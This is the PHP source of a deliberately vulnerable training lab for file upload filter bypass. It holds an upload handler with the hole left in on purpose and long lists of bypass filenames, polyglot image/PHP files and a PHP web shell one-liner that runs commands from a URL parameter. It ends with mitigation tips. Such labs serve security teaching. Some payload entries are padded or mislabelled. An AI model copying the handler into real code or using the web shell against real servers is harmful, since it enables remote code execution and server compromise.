<?php
// Lab 2: File Upload with Filter Bypass
// Vulnerability: File upload with security filters that can be bypassed

session_start();

$message = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Simulate file upload with filters (vulnerable to bypass)
function process_file_upload_with_filters($file) {
    // Basic security filters (can be bypassed)
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf', 'doc', 'docx'];
    $allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'];
    $max_file_size = 5 * 1024 * 1024; // 5MB
    
    if (empty($file['name'])) {
        return false;
    }
    
    // Check file size
    if ($file['size'] > $max_file_size) {
        return false;
    }
    
    // Get file extension
    $file_extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    // Check extension
    if (!in_array($file_extension, $allowed_extensions)) {
        return false;
    }
    
    // Check MIME type
    if (!in_array($file['type'], $allowed_mime_types)) {
        return false;
    }
    
    // Vulnerable: Basic filters that can be bypassed
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $file_path = $upload_dir . basename($file['name']);
    
    if (move_uploaded_file($file['tmp_name'], $file_path)) {
        return $file_path;
    }
    
    return false;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $file_path = process_file_upload_with_filters($_FILES['file']);
        
        if ($file_path) {
            $file_data = [
                'name' => $_FILES['file']['name'],
                'type' => $_FILES['file']['type'],
                'size' => $_FILES['file']['size'],
                'path' => $file_path,
                'uploaded_at' => date('Y-m-d H:i:s')
            ];
            
            $_SESSION['uploaded_files'][] = $file_data;
            $uploaded_files = $_SESSION['uploaded_files'];
            $message = '<div class="alert alert-success">File uploaded successfully!</div>';
        } else {
            $message = '<div class="alert alert-danger">File upload failed! Check file type and size.</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Please select a file to upload!</div>';
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        $file = $uploaded_files[$file_index];
        if (file_exists($file['path'])) {
            unlink($file['path']);
        }
        
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: File Upload with Filter Bypass - File Upload Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .uploaded-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .filter-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to File Upload Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: File Upload with Filter Bypass</h1>
            <p class="hero-subtitle">File upload with security filters that can be bypassed</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates file upload vulnerabilities where basic security filters are implemented but can be bypassed using various techniques. The application filters file types and MIME types but doesn't prevent all attack vectors.</p>
            <p><strong>Objective:</strong> Bypass security filters to upload malicious files and achieve server compromise.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code with Filters
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Basic filters that can be bypassed
function process_file_upload_with_filters($file) {
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf'];
    $allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif', 'text/plain'];
    $max_file_size = 5 * 1024 * 1024; // 5MB
    
    // Check file size
    if ($file['size'] > $max_file_size) {
        return false;
    }
    
    // Check extension
    $file_extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($file_extension, $allowed_extensions)) {
        return false;
    }
    
    // Check MIME type
    if (!in_array($file['type'], $allowed_mime_types)) {
        return false;
    }
    
    // Still vulnerable to bypass techniques
    return move_uploaded_file($file['tmp_name'], $file_path);
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Filtered File Upload
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="filter-info">
                            <h5>Active Filters</h5>
                            <p>The following are filtered:</p>
                            <ul>
                                <li><strong>Extensions:</strong> jpg, jpeg, png, gif, txt, pdf, doc, docx</li>
                                <li><strong>MIME Types:</strong> image/jpeg, image/png, image/gif, text/plain, application/pdf, application/msword, application/vnd.openxmlformats-officedocument.wordprocessingml.document</li>
                                <li><strong>File Size:</strong> Maximum 5MB</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Bypass Techniques</h5>
                            <p>Try these bypass methods:</p>
                            <ul>
                                <li><code>webshell.php.jpg</code> - Double extension</li>
                                <li><code>webshell.php%00.jpg</code> - Null byte injection</li>
                                <li><code>webshell.php;.jpg</code> - Semicolon bypass</li>
                                <li><code>webshell.php.jpg</code> - Case variation</li>
                            </ul>
                        </div>
                        
                        <form method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file" class="form-label">Select File to Upload</label>
                                <input type="file" class="form-control" id="file" name="file" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-files me-2"></i>Uploaded Files
                    </div>
                    <div class="card-body">
                        <?php if (empty($uploaded_files)): ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php else: ?>
                            <?php foreach ($uploaded_files as $index => $file): ?>
                                <div class="input-info">
                                    <h5>File <?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['name']); ?></h5>
                                    <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                    <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                    <p><strong>Path:</strong> <?php echo htmlspecialchars($file['path']); ?></p>
                                    <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                    
                                    <div class="mt-2">
                                        <a href="<?php echo htmlspecialchars($file['path']); ?>" class="btn btn-sm btn-primary" target="_blank">View File</a>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> File Upload with Filter Bypass</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Inadequate security filters</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Techniques</h5>
                    <ul>
                        <li><strong>Double Extension:</strong> Use multiple extensions</li>
                        <li><strong>Null Byte:</strong> Inject null bytes</li>
                        <li><strong>Case Variation:</strong> Use different cases</li>
                        <li><strong>Special Characters:</strong> Use semicolons, spaces</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>File Upload Filter Bypass Payloads</h5>
            <p>Use these techniques to bypass security filters:</p>
            
            <h6>1. Double Extension Bypass:</h6>
            <div class="code-block">webshell.php.jpg
webshell.php.png
webshell.php.gif
webshell.php.txt
webshell.php.pdf</div>

            <h6>2. Null Byte Injection Bypass:</h6>
            <div class="code-block">webshell.php%00.jpg
webshell.php%00.png
webshell.php%00.gif
webshell.php%00.txt
webshell.php%00.pdf</div>

            <h6>3. Semicolon Bypass:</h6>
            <div class="code-block">webshell.php;.jpg
webshell.php;.png
webshell.php;.gif
webshell.php;.txt
webshell.php;.pdf</div>

            <h6>4. Case Variation Bypass:</h6>
            <div class="code-block">webshell.PHP
webshell.Php
webshell.pHp
webshell.php
webshell.PHP.JPG</div>

            <h6>5. Space Bypass:</h6>
            <div class="code-block">webshell.php .jpg
webshell.php .png
webshell.php .gif
webshell.php .txt
webshell.php .pdf</div>

            <h6>6. Dot Bypass:</h6>
            <div class="code-block">webshell.php.
webshell.php...
webshell.php....jpg
webshell.php.....png</div>

            <h6>7. Slash Bypass:</h6>
            <div class="code-block">webshell.php/
webshell.php//
webshell.php/../.jpg
webshell.php/../../.png</div>

            <h6>8. Backslash Bypass:</h6>
            <div class="code-block">webshell.php\
webshell.php\\
webshell.php\..\.jpg
webshell.php\..\..\.png</div>

            <h6>9. URL Encoding Bypass:</h6>
            <div class="code-block">webshell.php%2e%6a%70%67
webshell.php%2e%70%6e%67
webshell.php%2e%67%69%66
webshell.php%2e%74%78%74</div>

            <h6>10. Unicode Bypass:</h6>
            <div class="code-block">webshell.php%u002e%u006a%u0070%u0067
webshell.php%u002e%u0070%u006e%u0067
webshell.php%u002e%u0067%u0069%u0066
webshell.php%u002e%u0074%u0078%u0074</div>

            <h6>11. MIME Type Bypass:</h6>
            <div class="code-block"># Upload with image MIME type
Content-Type: image/jpeg
# But file content is PHP code
<?php system($_GET['cmd']); ?></div>

            <h6>12. Magic Number Bypass:</h6>
            <div class="code-block"># Add image magic numbers to PHP file
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 48 00 00
<?php system($_GET['cmd']); ?></div>

            <h6>13. Polyglot File Bypass:</h6>
            <div class="code-block"># Create a file that is both valid image and PHP
GIF89a<?php system($_GET['cmd']); ?>
# Or
PNG<?php system($_GET['cmd']); ?></div>

            <h6>14. Archive Bypass:</h6>
            <div class="code-block"># Upload as ZIP file
webshell.php.zip
# Extract to get PHP file
# Or upload as RAR
webshell.php.rar</div>

            <h6>15. Executable Bypass:</h6>
            <div class="code-block"># Upload as executable
webshell.php.exe
webshell.php.bat
webshell.php.cmd
webshell.php.scr</div>

            <h6>16. Configuration Bypass:</h6>
            <div class="code-block"># Upload as config file
webshell.php.conf
webshell.php.cfg
webshell.php.ini
webshell.php.xml</div>

            <h6>17. Template Bypass:</h6>
            <div class="code-block"># Upload as template
webshell.php.tpl
webshell.php.template
webshell.php.html
webshell.php.htm</div>

            <h6>18. Script Bypass:</h6>
            <div class="code-block"># Upload as script
webshell.php.js
webshell.php.vbs
webshell.php.py
webshell.php.pl</div>

            <h6>19. Database Bypass:</h6>
            <div class="code-block"># Upload as database file
webshell.php.db
webshell.php.sql
webshell.php.mdb
webshell.php.accdb</div>

            <h6>20. Advanced Bypass Techniques:</h6>
            <div class="code-block"># Multiple bypasses combined
webshell.php%00.jpg
webshell.php;.png
webshell.PHP.JPG
webshell.php .gif
webshell.php...
webshell.php/
webshell.php\
webshell.php%2e%6a%70%67
webshell.php%u002e%u006a%u0070%u0067</div>

            <h6>21. Content-Type Manipulation:</h6>
            <div class="code-block"># Change Content-Type header
Content-Type: image/jpeg
# But file content is PHP
<?php system($_GET['cmd']); ?>

# Or use multipart/form-data
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--</div>

            <h6>22. File Content Manipulation:</h6>
            <div class="code-block"># Add image headers to PHP file
GIF89a<?php system($_GET['cmd']); ?>
# Or
PNG<?php system($_GET['cmd']); ?>
# Or
JPEG<?php system($_GET['cmd']); ?></div>

            <h6>23. Path Traversal Bypass:</h6>
            <div class="code-block"># Use path traversal
../webshell.php
../../webshell.php
../../../webshell.php
....//....//....//webshell.php</div>

            <h6>24. Filename Obfuscation:</h6>
            <div class="code-block"># Obfuscate filename
w3bsh3ll.php
webshell.phtml
webshell.php3
webshell.php4
webshell.php5
webshell.php7</div>

            <h6>25. Complete Bypass Examples:</h6>
            <div class="code-block"># Example 1: Double extension with null byte
webshell.php%00.jpg

# Example 2: Case variation with semicolon
webshell.PHP;.JPG

# Example 3: Space with dot
webshell.php .jpg

# Example 4: URL encoded
webshell.php%2e%6a%70%67

# Example 5: Unicode encoded
webshell.php%u002e%u006a%u0070%u0067</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass WAFs and security filters</li>
                <li>Upload malicious files despite protections</li>
                <li>Execute arbitrary code on the server</li>
                <li>Compromise server and data integrity</li>
                <li>Install persistent backdoors</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive file validation and sanitization</li>
                    <li>Use whitelist-based filtering instead of blacklists</li>
                    <li>Implement file content validation using magic numbers</li>
                    <li>Use proper file permissions and access controls</li>
                    <li>Store uploaded files outside web root directory</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns</li>
                    <li>Implement Content Security Policy (CSP)</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
